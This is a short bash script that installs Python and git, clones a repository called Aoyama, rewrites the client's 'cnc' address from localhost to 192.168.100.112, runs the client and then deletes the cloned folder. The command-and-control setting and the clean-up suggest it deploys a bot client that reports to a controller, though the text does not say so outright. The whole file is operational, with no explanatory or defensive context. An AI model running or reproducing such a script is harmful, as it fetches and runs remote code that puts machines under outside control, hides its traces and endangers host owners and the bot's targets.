#!/bin/bash
yum install -y python3;
yum install -y git;
git clone https://github.com/Leeon123/Aoyama.git;
cd Aoyama/;
sed -i "s/cnc                  = \"127.0.0.1\"/cnc                  = \"192.168.100.112\"/g" client.py;
python3 client.py;
cd -;
rm -rf Aoyama/;